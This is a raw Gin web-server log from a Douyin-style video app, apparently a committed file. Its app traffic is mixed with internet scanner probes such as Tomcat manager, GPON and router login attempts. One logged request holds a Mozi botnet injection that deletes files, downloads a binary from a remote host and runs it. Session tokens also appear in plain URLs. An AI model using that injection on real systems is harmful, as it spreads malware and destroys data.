+[GIN] 2022/05/25 - 13:41:48 | 404 |         566ns |   190.75.87.178 | GET      "/"
+[GIN] 2022/05/25 - 13:48:42 | 404 |         563ns |   89.243.16.108 | GET      "/"
+[GIN] 2022/05/25 - 14:36:44 | 404 |       1.125µs |    2.58.149.222 | GET      "/"
+[GIN] 2022/05/25 - 15:10:16 | 404 |         561ns |     83.97.20.34 | GET      "/"
+[GIN] 2022/05/25 - 15:24:59 | 404 |         546ns |  128.14.134.134 | GET      "/"
+[GIN] 2022/05/25 - 15:30:10 | 404 |         564ns |   100.20.87.160 | GET      "/"
+[GIN] 2022/05/25 - 15:42:47 | 404 |         644ns |    175.204.37.8 | POST     "/editBlackAndWhiteList"
+[GIN] 2022/05/25 - 15:52:10 | 404 |         636ns |    60.17.107.36 | HEAD     "/"
+[GIN] 2022/05/25 - 16:21:35 | 404 |         354ns |  137.184.37.199 | GET      "/manager/html"
+[GIN] 2022/05/25 - 17:22:04 | 404 |         528ns |    47.196.28.63 | POST     "/editBlackAndWhiteList"
+[GIN] 2022/05/25 - 17:38:17 | 404 |        2.05µs |    5.255.98.103 | GET      "/manager/html"
+[GIN] 2022/05/25 - 18:18:25 | 404 |        2.02µs | 192.241.212.190 | GET      "/actuator/health"
+[GIN] 2022/05/25 - 20:13:53 | 404 |         555ns |    117.62.18.91 | POST     "/editBlackAndWhiteList"
+[GIN] 2022/05/25 - 20:22:54 | 404 |         680ns | 167.248.133.118 | GET      "/"
+[GIN] 2022/05/25 - 20:22:54 | 404 |       1.052µs | 167.248.133.118 | GET      "/"
+[GIN] 2022/05/25 - 20:22:55 | 404 |         411ns | 167.248.133.118 | PRI      "*"
+[GIN] 2022/05/25 - 20:54:38 | 404 |         693ns |   61.84.201.154 | POST     "/editBlackAndWhiteList"
+[GIN] 2022/05/25 - 21:00:05 | 404 |         904ns |     60.17.115.5 | HEAD     "/"
+[GIN] 2022/05/25 - 22:20:20 | 404 |         702ns |  216.218.206.68 | GET      "/"
+[GIN] 2022/05/25 - 22:24:06 | 404 |       1.295µs |    5.255.98.103 | GET      "/manager/html"
+[GIN] 2022/05/25 - 22:37:56 | 404 |         598ns | 199.195.249.217 | GET      "/manager/html"
+[GIN] 2022/05/25 - 22:38:08 | 404 |         563ns | 199.195.249.217 | GET      "/manager/html"
+[GIN] 2022/05/25 - 23:28:48 | 404 |         463ns |    151.235.26.4 | GET      "/"
+[GIN] 2022/05/25 - 23:57:41 | 404 |         568ns |  101.133.224.44 | GET      "/"
+[GIN] 2022/05/25 - 23:57:47 | 404 |         861ns |  101.133.224.44 | OPTIONS  "/"
+[GIN] 2022/05/25 - 23:57:57 | 404 |       1.192µs |  101.133.224.44 | GET      "/nice ports,/Trinity.txt.bak"
+[GIN] 2022/05/26 - 00:04:07 | 404 |         542ns |  101.133.224.44 | GET      "/nmaplowercheck1653494644"
+[GIN] 2022/05/26 - 00:04:07 | 404 |         576ns |  101.133.224.44 | GET      "/HNAP1"
+[GIN] 2022/05/26 - 00:04:25 | 404 |         765ns |  101.133.224.44 | POST     "/sdk"
+[GIN] 2022/05/26 - 00:04:30 | 404 |       1.228µs |  101.133.224.44 | GET      "/nmaplowercheck1653494645"
+[GIN] 2022/05/26 - 00:04:30 | 404 |         767ns |  101.133.224.44 | GET      "/evox/about"
+[GIN] 2022/05/26 - 00:04:44 | 404 |         531ns |  101.133.224.44 | GET      "/"
+[GIN] 2022/05/26 - 01:05:30 | 404 |         838ns |   220.80.230.56 | POST     "/editBlackAndWhiteList"
+[GIN] 2022/05/26 - 01:12:51 | 404 |         619ns | 219.143.174.173 | HEAD     "/"
+[GIN] 2022/05/26 - 01:25:36 | 404 |         908ns |  23.225.163.211 | GET      "/favicon.ico"
+[GIN] 2022/05/26 - 01:25:37 | 404 |         452ns |  23.225.163.211 | GET      "/robots.txt"
+[GIN] 2022/05/26 - 01:25:37 | 404 |         419ns |  23.225.163.211 | GET      "/sitemap.xml"
+[GIN] 2022/05/26 - 01:32:02 | 404 |         561ns |   116.74.254.18 | POST     "/editBlackAndWhiteList"
+[GIN] 2022/05/26 - 02:21:55 | 404 |         531ns |    94.102.61.45 | GET      "/"
+[GIN] 2022/05/26 - 02:21:57 | 404 |       1.271µs |   14.32.237.165 | POST     "/editBlackAndWhiteList"
+[GIN] 2022/05/26 - 02:31:01 | 404 |         597ns | 162.142.125.212 | GET      "/"
+[GIN] 2022/05/26 - 02:31:02 | 404 |         691ns | 162.142.125.212 | GET      "/"
+[GIN] 2022/05/26 - 02:31:02 | 404 |         931ns | 162.142.125.212 | PRI      "*"
+[GIN] 2022/05/26 - 03:00:57 | 404 |         538ns |    115.63.25.31 | POST     "/editBlackAndWhiteList"
+[GIN] 2022/05/26 - 03:25:06 | 404 |         620ns |   78.108.177.50 | GET      "/"
+[GIN] 2022/05/26 - 03:52:14 | 404 |         893ns |   205.210.31.29 | GET      "/"
+[GIN] 2022/05/26 - 04:01:35 | 404 |         800ns |  106.75.223.168 | GET      "/"
+[GIN] 2022/05/26 - 04:02:34 | 404 |         567ns |   205.210.31.21 | GET      "/"
+[GIN] 2022/05/26 - 04:06:35 | 404 |       1.451µs |   128.14.133.58 | GET      "/"
+[GIN] 2022/05/26 - 04:13:31 | 404 |       1.409µs |    8.219.71.118 | GET      "/"
+[GIN] 2022/05/26 - 04:17:30 | 404 |       1.493µs |    8.219.71.118 | GET      "/"
+[GIN] 2022/05/26 - 05:06:26 | 404 |       1.229µs |    81.163.8.228 | GET      "/boaform/admin/formLogin?username=ec8&psd=ec8"
+[GIN] 2022/05/26 - 05:17:10 | 404 |         681ns |    153.36.8.131 | POST     "/GponForm/diag_Form?images/"
+[GIN] 2022/05/26 - 06:48:41 | 404 |         861ns |   5.255.100.229 | GET      "/"
+[GIN] 2022/05/26 - 07:22:31 | 404 |         414ns |    5.255.98.103 | GET      "/manager/html"
+[GIN] 2022/05/26 - 07:34:17 | 404 |         435ns |  206.189.56.187 | HEAD     "/"
+[GIN] 2022/05/26 - 07:34:17 | 404 |         368ns |  206.189.56.187 | GET      "/system_api.php"
+[GIN] 2022/05/26 - 07:34:18 | 404 |         811ns |  206.189.56.187 | GET      "/c/version.js"
+[GIN] 2022/05/26 - 07:34:19 | 404 |         549ns |  206.189.56.187 | GET      "/streaming/clients_live.php"
+[GIN] 2022/05/26 - 07:34:19 | 404 |         543ns |  206.189.56.187 | GET      "/stalker_portal/c/version.js"
+[GIN] 2022/05/26 - 07:34:20 | 404 |         931ns |  206.189.56.187 | GET      "/stream/live.php"
+[GIN] 2022/05/26 - 07:34:20 | 404 |         689ns |  206.189.56.187 | GET      "/flu/403.html"
+[GIN] 2022/05/26 - 07:34:21 | 404 |      16.069µs |  206.189.56.187 | GET      "/"
+[GIN] 2022/05/26 - 07:59:40 | 404 |         637ns |   45.61.185.106 | GET      "/manager/html"
+[GIN] 2022/05/26 - 09:17:06 | 404 |         634ns |     193.124.7.9 | GET      "/"
+[GIN] 2022/05/26 - 09:43:38 | 404 |         531ns |   106.14.47.169 | GET      "/"
+[GIN] 2022/05/26 - 10:20:16 | 404 |         996ns |  167.94.138.118 | GET      "/"
+[GIN] 2022/05/26 - 10:20:16 | 404 |         848ns |  167.94.138.118 | GET      "/"
+[GIN] 2022/05/26 - 10:20:17 | 404 |         634ns |  167.94.138.118 | PRI      "*"
+[GIN] 2022/05/26 - 10:27:35 | 404 |         905ns |  90.229.173.229 | GET      "/"
+[GIN] 2022/05/26 - 10:27:36 | 404 |         831ns |   131.150.67.66 | GET      "/"
+[GIN] 2022/05/26 - 10:51:54 | 404 |       1.338µs |   45.132.194.14 | CONNECT  ""
+[GIN] 2022/05/26 - 10:53:02 | 404 |         438ns |   110.80.168.45 | HEAD     "/"
+[GIN] 2022/05/26 - 10:59:02 | 200 |  707.209331ms |  112.44.121.136 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/26 - 10:59:03 | 206 |  1.714678989s |  112.44.121.136 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/26 - 10:59:04 | 206 |  181.072112ms |  112.44.121.136 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/26 - 10:59:04 | 200 |  168.638346ms |  112.44.121.136 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/26 - 10:59:05 | 206 |  660.365337ms |  112.44.121.136 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/26 - 10:59:05 | 206 |  717.926089ms |  112.44.121.136 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/26 - 10:59:06 | 206 |  326.041405ms |  112.44.121.136 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/26 - 10:59:28 | 206 | 21.571468296s |  112.44.121.136 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/26 - 11:16:49 | 404 |         722ns | 101.132.127.176 | GET      "/mtyy/buyCheckCode?vip=1207123&timestamp=1653181234567&sign=ab12345678901234567801234567890&TCLX=2"
+[GIN] 2022/05/26 - 12:17:06 | 404 |       1.064µs |     183.97.2.15 | POST     "/editBlackAndWhiteList"
+[GIN] 2022/05/26 - 12:24:49 | 404 |         874ns |    5.255.98.103 | GET      "/manager/html"
+[GIN] 2022/05/26 - 12:27:50 | 404 |         460ns |   46.174.191.29 | GET      "/"
+[GIN] 2022/05/26 - 12:33:33 | 404 |         374ns |    128.1.248.42 | GET      "/"
+[GIN] 2022/05/26 - 12:42:39 | 404 |         552ns |  184.105.139.68 | GET      "/"
+[GIN] 2022/05/26 - 13:07:56 | 404 |         634ns |   68.183.147.50 | GET      "/"
+[GIN] 2022/05/26 - 13:25:33 | 404 |         555ns |  20.242.114.100 | GET      "/"
+[GIN] 2022/05/26 - 13:31:28 | 404 |         468ns | 175.184.165.141 | HEAD     "/"
+[GIN] 2022/05/26 - 13:47:40 | 404 |       1.987µs |  117.223.90.251 | GET      "/board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://117.223.90.251:41491/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron"
+2022/05/26 13:47:40 http: URL query contains semicolon, which is no longer a supported separator; parts of the query may be stripped when parsed; see golang.org/issue/25192
+[GIN] 2022/05/26 - 14:00:11 | 404 |         594ns |  117.199.219.39 | GET      "/"
+[GIN] 2022/05/26 - 14:23:56 | 404 |         661ns | 103.157.150.112 | POST     "/editBlackAndWhiteList"
+[GIN] 2022/05/26 - 15:45:03 | 404 |         380ns |   128.14.141.34 | GET      "/"
+[GIN-debug] redirecting request 301: /douyin/feed/ --> /douyin/feed/?latest_time=1653552644391&token=889871ff7dd0423b970e2e98b619bba9
+[mysql] 2022/05/26 16:10:44 packets.go:123: closing bad idle connection: unexpected read from socket
+[mysql] 2022/05/26 16:10:44 packets.go:123: closing bad idle connection: unexpected read from socket
+
+2022/05/26 16:10:44 /home/douyin/douyin/douyin-v1.0.7/dao/VideoDao.go:16
+[214.915ms] [rows:3] SELECT `video_t`.`id`,`video_t`.`author_id`,`video_t`.`play_url`,`video_t`.`cover_url`,`video_t`.`favorite_count`,`video_t`.`comment_count`,`video_t`.`create_time`,`Author`.`user_id` AS `Author__user_id`,`Author`.`user_name` AS `Author__user_name`,`Author`.`password` AS `Author__password`,`Author`.`salt` AS `Author__salt`,`Author`.`follow_count` AS `Author__follow_count`,`Author`.`follower_count` AS `Author__follower_count`,`Author`.`create_time` AS `Author__create_time` FROM `video_t` LEFT JOIN `user_t` `Author` ON `video_t`.`author_id` = `Author`.`user_id` ORDER BY create_time DESC LIMIT 30
+[GIN] 2022/05/26 - 16:10:44 | 200 |  215.104633ms |    116.169.0.47 | GET      "/douyin/feed/?latest_time=1653552644391&token=889871ff7dd0423b970e2e98b619bba9"
+[GIN-debug] redirecting request 301: /douyin/feed/ --> /douyin/feed/?latest_time=1653552644864&token=889871ff7dd0423b970e2e98b619bba9
+
+2022/05/26 16:10:44 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[71.763ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/26 16:10:44 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[71.592ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+[GIN] 2022/05/26 - 16:10:44 | 200 |  143.554909ms |    116.169.0.47 | GET      "/douyin/publish/list/?token=889871ff7dd0423b970e2e98b619bba9&user_id=10"
+
+2022/05/26 16:10:44 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[222.524ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/26 16:10:44 /home/douyin/douyin/douyin-v1.0.7/dao/VideoDao.go:16
+[206.555ms] [rows:3] SELECT `video_t`.`id`,`video_t`.`author_id`,`video_t`.`play_url`,`video_t`.`cover_url`,`video_t`.`favorite_count`,`video_t`.`comment_count`,`video_t`.`create_time`,`Author`.`user_id` AS `Author__user_id`,`Author`.`user_name` AS `Author__user_name`,`Author`.`password` AS `Author__password`,`Author`.`salt` AS `Author__salt`,`Author`.`follow_count` AS `Author__follow_count`,`Author`.`follower_count` AS `Author__follower_count`,`Author`.`create_time` AS `Author__create_time` FROM `video_t` LEFT JOIN `user_t` `Author` ON `video_t`.`author_id` = `Author`.`user_id` ORDER BY create_time DESC LIMIT 30
+[GIN] 2022/05/26 - 16:10:44 | 200 |  206.657495ms |    116.169.0.47 | GET      "/douyin/feed/?latest_time=1653552644864&token=889871ff7dd0423b970e2e98b619bba9"
+
+2022/05/26 16:10:44 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[63.801ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+
+2022/05/26 16:10:44 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:47
+[68.885ms] [rows:13] SELECT * FROM `favorite_video_t` WHERE user_id = 8
+
+2022/05/26 16:10:44 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:53
+[69.010ms] [rows:2] SELECT * FROM `video_t` WHERE id in (21,21,21,21,21,21,21,21,21,21,21,21,20)
+[GIN] 2022/05/26 - 16:10:44 | 200 |   424.67781ms |    116.169.0.47 | GET      "/douyin/favorite/list/?token=889871ff7dd0423b970e2e98b619bba9&user_id=10"
+[GIN] 2022/05/26 - 16:10:45 | 200 |  544.782112ms |    116.169.0.47 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/26 - 16:10:45 | 206 |  854.586263ms |    116.169.0.47 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/26 - 16:10:46 | 206 |  179.812939ms |    116.169.0.47 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+
+2022/05/26 16:10:46 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[68.994ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/26 16:10:46 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[71.407ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/26 16:10:46 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[68.829ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+
+2022/05/26 16:10:46 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[71.406ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+[GIN] 2022/05/26 - 16:10:46 | 200 |  142.986624ms |    116.169.0.47 | GET      "/douyin/publish/list/?token=889871ff7dd0423b970e2e98b619bba9&user_id=10"
+
+2022/05/26 16:10:46 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:47
+[68.954ms] [rows:13] SELECT * FROM `favorite_video_t` WHERE user_id = 8
+
+2022/05/26 16:10:46 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:53
+[68.963ms] [rows:2] SELECT * FROM `video_t` WHERE id in (21,21,21,21,21,21,21,21,21,21,21,21,20)
+[GIN] 2022/05/26 - 16:10:46 | 200 |  276.069919ms |    116.169.0.47 | GET      "/douyin/favorite/list/?token=889871ff7dd0423b970e2e98b619bba9&user_id=10"
+[GIN] 2022/05/26 - 16:10:47 | 200 |  805.208274ms |    116.169.0.47 | GET      "/static/10_1653225603_VID_20220504_201616.mp4"
+
+2022/05/26 16:10:47 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[69.035ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+[GIN] 2022/05/26 - 16:10:47 | 206 |  159.958559ms |    116.169.0.47 | GET      "/static/10_1653225603_VID_20220504_201616.mp4"
+
+2022/05/26 16:10:47 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[71.435ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/26 16:10:47 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[68.940ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+[GIN] 2022/05/26 - 16:10:47 | 200 |  138.218311ms |    116.169.0.47 | GET      "/douyin/publish/list/?token=889871ff7dd0423b970e2e98b619bba9&user_id=10"
+
+2022/05/26 16:10:47 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[71.473ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+
+2022/05/26 16:10:47 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:47
+[71.656ms] [rows:13] SELECT * FROM `favorite_video_t` WHERE user_id = 8
+
+2022/05/26 16:10:47 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:53
+[71.649ms] [rows:2] SELECT * FROM `video_t` WHERE id in (21,21,21,21,21,21,21,21,21,21,21,21,20)
+[GIN] 2022/05/26 - 16:10:47 | 200 |  286.653913ms |    116.169.0.47 | GET      "/douyin/favorite/list/?token=889871ff7dd0423b970e2e98b619bba9&user_id=10"
+[GIN-debug] redirecting request 301: /douyin/feed/ --> /douyin/feed/?latest_time=1653552648558&token=889871ff7dd0423b970e2e98b619bba9
+[GIN] 2022/05/26 - 16:10:48 | 200 |  714.980194ms |    116.169.0.47 | GET      "/static/10_1653225565_VID_20220504_201616.mp4"
+
+2022/05/26 16:10:48 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[68.811ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/26 16:10:48 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[71.523ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/26 16:10:48 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[69.160ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+[GIN] 2022/05/26 - 16:10:48 | 200 |  138.154361ms |    116.169.0.47 | GET      "/douyin/publish/list/?token=889871ff7dd0423b970e2e98b619bba9&user_id=10"
+
+2022/05/26 16:10:48 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[71.362ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+
+2022/05/26 16:10:48 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:47
+[71.545ms] [rows:13] SELECT * FROM `favorite_video_t` WHERE user_id = 8
+
+2022/05/26 16:10:48 /home/douyin/douyin/douyin-v1.0.7/dao/VideoDao.go:16
+[199.447ms] [rows:3] SELECT `video_t`.`id`,`video_t`.`author_id`,`video_t`.`play_url`,`video_t`.`cover_url`,`video_t`.`favorite_count`,`video_t`.`comment_count`,`video_t`.`create_time`,`Author`.`user_id` AS `Author__user_id`,`Author`.`user_name` AS `Author__user_name`,`Author`.`password` AS `Author__password`,`Author`.`salt` AS `Author__salt`,`Author`.`follow_count` AS `Author__follow_count`,`Author`.`follower_count` AS `Author__follower_count`,`Author`.`create_time` AS `Author__create_time` FROM `video_t` LEFT JOIN `user_t` `Author` ON `video_t`.`author_id` = `Author`.`user_id` ORDER BY create_time DESC LIMIT 30
+[GIN] 2022/05/26 - 16:10:48 | 200 |  199.645952ms |    116.169.0.47 | GET      "/douyin/feed/?latest_time=1653552648558&token=889871ff7dd0423b970e2e98b619bba9"
+
+2022/05/26 16:10:48 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:53
+[71.740ms] [rows:2] SELECT * FROM `video_t` WHERE id in (21,21,21,21,21,21,21,21,21,21,21,21,20)
+[GIN] 2022/05/26 - 16:10:48 | 200 |  286.529845ms |    116.169.0.47 | GET      "/douyin/favorite/list/?token=889871ff7dd0423b970e2e98b619bba9&user_id=10"
+[GIN] 2022/05/26 - 16:10:48 | 200 |  700.258943ms |    116.169.0.47 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+
+2022/05/26 16:10:48 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[66.819ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/26 16:10:48 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[68.715ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/26 16:10:49 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[66.654ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+[GIN] 2022/05/26 - 16:10:49 | 200 |   133.69571ms |    116.169.0.47 | GET      "/douyin/publish/list/?token=889871ff7dd0423b970e2e98b619bba9&user_id=10"
+
+2022/05/26 16:10:49 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[68.718ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+
+2022/05/26 16:10:49 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:47
+[68.738ms] [rows:13] SELECT * FROM `favorite_video_t` WHERE user_id = 8
+
+2022/05/26 16:10:49 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:53
+[69.272ms] [rows:2] SELECT * FROM `video_t` WHERE id in (21,21,21,21,21,21,21,21,21,21,21,21,20)
+[GIN] 2022/05/26 - 16:10:49 | 200 |  275.856354ms |    116.169.0.47 | GET      "/douyin/favorite/list/?token=889871ff7dd0423b970e2e98b619bba9&user_id=10"
+[GIN] 2022/05/26 - 16:10:49 | 200 |  1.005109208s |    116.169.0.47 | GET      "/static/10_1653225603_VID_20220504_201616.mp4"
+
+2022/05/26 16:10:50 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[69.090ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/26 16:10:50 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[66.760ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+[GIN] 2022/05/26 - 16:10:50 | 206 |   159.92421ms |    116.169.0.47 | GET      "/static/10_1653225603_VID_20220504_201616.mp4"
+
+2022/05/26 16:10:50 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[68.882ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+
+2022/05/26 16:10:50 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[66.562ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+[GIN] 2022/05/26 - 16:10:50 | 200 |  133.566279ms |    116.169.0.47 | GET      "/douyin/publish/list/?token=889871ff7dd0423b970e2e98b619bba9&user_id=10"
+
+2022/05/26 16:10:50 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:47
+[68.931ms] [rows:13] SELECT * FROM `favorite_video_t` WHERE user_id = 8
+
+2022/05/26 16:10:50 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:53
+[69.280ms] [rows:2] SELECT * FROM `video_t` WHERE id in (21,21,21,21,21,21,21,21,21,21,21,21,20)
+[GIN] 2022/05/26 - 16:10:50 | 200 |  276.638658ms |    116.169.0.47 | GET      "/douyin/favorite/list/?token=889871ff7dd0423b970e2e98b619bba9&user_id=10"
+[GIN] 2022/05/26 - 16:10:50 | 200 |  354.537992ms |    116.169.0.47 | GET      "/static/10_1653225565_VID_20220504_201616.mp4"
+
+2022/05/26 16:10:50 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[66.853ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/26 16:10:50 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[68.642ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/26 16:10:50 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[66.564ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+[GIN] 2022/05/26 - 16:10:50 | 200 |  133.596322ms |    116.169.0.47 | GET      "/douyin/publish/list/?token=889871ff7dd0423b970e2e98b619bba9&user_id=10"
+
+2022/05/26 16:10:50 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[68.789ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+
+2022/05/26 16:10:50 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:47
+[68.842ms] [rows:13] SELECT * FROM `favorite_video_t` WHERE user_id = 8
+
+2022/05/26 16:10:50 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:53
+[68.977ms] [rows:2] SELECT * FROM `video_t` WHERE id in (21,21,21,21,21,21,21,21,21,21,21,21,20)
+[GIN] 2022/05/26 - 16:10:50 | 200 |  275.654794ms |    116.169.0.47 | GET      "/douyin/favorite/list/?token=889871ff7dd0423b970e2e98b619bba9&user_id=10"
+[GIN] 2022/05/26 - 16:10:51 | 200 |  999.765155ms |    116.169.0.47 | GET      "/static/10_1653225603_VID_20220504_201616.mp4"
